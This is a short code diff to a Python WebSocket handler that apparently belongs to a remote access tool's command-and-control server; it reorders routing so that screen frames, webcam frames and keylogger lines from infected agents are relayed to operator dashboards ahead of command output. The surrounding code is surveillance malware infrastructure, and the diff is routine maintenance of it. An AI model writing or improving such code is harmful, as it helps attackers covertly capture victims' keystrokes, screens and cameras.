@@ -59,13 +59,8 @@ async def ws_agent(ws: WebSocket):
                 await manager.complete_stats_request(req_id, payload)
                 continue
 
-            if 'output' in data:
-                await manager.relay_output_to_dashboards(agent_id, str(data['output']))
-            elif 'line' in data:
-                await manager.relay_output_to_dashboards(agent_id, str(data['line']))
-            elif 'exit_code' in data:
-                await manager.relay_exit_to_dashboards(agent_id, int(data['exit_code']))
-            elif data.get('type') == 'screen_frame':
+            # Handle typed streaming events first to avoid mis-routing
+            if data.get('type') == 'screen_frame':
                 frame = {k: data[k] for k in ('data','w','h','ts') if k in data}
                 await manager.relay_screen_to_dashboards(agent_id, frame)
             elif data.get('type') == 'camera_frame':
@@ -73,6 +68,12 @@ async def ws_agent(ws: WebSocket):
                 await manager.relay_camera_to_dashboards(agent_id, frame)
             elif data.get('type') == 'keylog_line':
                 await manager.relay_keylog_to_dashboards(agent_id, str(data.get('line','')))
+            elif 'output' in data:
+                await manager.relay_output_to_dashboards(agent_id, str(data['output']))
+            elif 'line' in data:
+                await manager.relay_output_to_dashboards(agent_id, str(data['line']))
+            elif 'exit_code' in data:
+                await manager.relay_exit_to_dashboards(agent_id, int(data['exit_code']))
             elif 'error' in data:
                 await manager.relay_output_to_dashboards(agent_id, str(data['error']))
             else:
